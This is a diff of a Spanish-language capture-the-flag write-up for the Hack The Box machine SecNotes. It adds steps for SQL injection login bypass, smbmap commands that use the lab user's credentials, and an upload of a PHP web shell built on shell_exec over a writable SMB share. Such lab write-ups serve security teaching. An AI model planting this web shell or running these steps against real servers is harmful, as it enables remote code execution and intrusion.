@@ -135,7 +135,7 @@ Respecto a la segunda página no hay prácticamente nada que podamos hacer, por 
 
 ### [](#header-3)Fase De Explotación
 
-La máquina _SecNotes_ cuenta con dos vías potenciales para realizar la intrusión, una vía [inyecciones SQL](https://mateonitro550.github.io/SQL-Injection) y otra vía [CSRF](https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)) (Cross-Site Request Forgery).
+La máquina _SecNotes_ cuenta con dos vías potenciales para realizar la intrusión, una vía [Inyecciones SQL](https://mateonitro550.github.io/SQL-Injection) y otra vía [CSRF](https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)) (Cross-Site Request Forgery).
 
 ### [](#header-3)Cross-Site Request Forgery
 
@@ -239,7 +239,7 @@ Vemos que conseguimos una petición por GET por parte de la máquina víctima, p
 
 Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa.
 
-Investigando un poco más, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.
+Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png)
 
@@ -247,15 +247,15 @@ Adicionalmente, si revisamos esta petición con `Burp Suite`, nos daremos cuenta
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png)
 
-Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos `Password` y `Confirm Password` de forma manual, nosotros lo haremos a través de la propia URL.
+Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos `Password` y `Confirm Password` de forma manual, los proporcionaremos a través de la propia URL.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png)
 
-Para ello, desde `Burp Suite`, habiendo capturado la petición del cambio de contraseña, simplemente haremos _click derecho_, _Change request method_, y copiaremos la petición por GET.
+Para ello, desde `Burp Suite`, habiendo capturado la petición del cambio de contraseña, simplemente haremos _click derecho_, _Change request method_, y copiaremos la nueva petición por GET.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png)
 
-De esta manera, si añadimos _http://10.10.10.97_ al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar las contraseñas a través del método GET; probémoslo.
+De esta manera, si añadimos _http://10.10.10.97_ al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png)
 
@@ -269,19 +269,58 @@ Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y co
 
 ### [](#header-3)SQL Injection
 
-Otro vector que podriamos considerar al encontrarnos frente a un panel de login sería probar [Inyecciones SQL](https://mateonitro550.github.io/SQL-Injection). De este modo lo que estamos haciendo es bypassear el panel con expresiones 
+Otro vector a considerar al encontrarnos frente a un panel de login sería probar [Inyecciones SQL](https://mateonitro550.github.io/SQL-Injection) con las cuales bypassear el panel.
+
+Al igual que cuando aplicamos fuerza bruta sobre el campo `Username`, podemos ayudarnos de un diccionario como el mismo [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/sqli.auth.bypass.txt), el cual contiene una buena cantidad de expresiones que podemos probar.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png)
 
+Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente `tyler`.
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png)
 
-Independientemente de como hayamos llegado aquí ... .
+Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con `SMBMap`.
+
+```bash
+smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGj0irkL%0G*&'
+```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png)
 
+Podemos observar que tenemos permiso de lectura y escritura sobre el recurso `new-site`, echemos un vistazo de manera recursiva sobre este.
+
+```bash
+smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGj0irkL%0G*&' -R 'new-site'
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png)
 
+A partir de este punto empezaremos a trabajar con `smbclient`, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI).
+
+Para saber de que se trata el contenido dentro del recurso `new-site` podemos descargarlo en nuestra máquina con el comando `get`, aunque podemos también intuirlo en base al nombre de los archivos, `IIS`.
+
+```
+get iisstart.htm
+get iisstart.png
+```
+
+Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto `8808`; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web.
+
+Empecemos por subir algo simple como una `web shell`.
+
+```php
+<?php
+  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+```
+put cmd.php
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png)
+
+Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo _/cmd.php?cmd=comando_.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png)
 
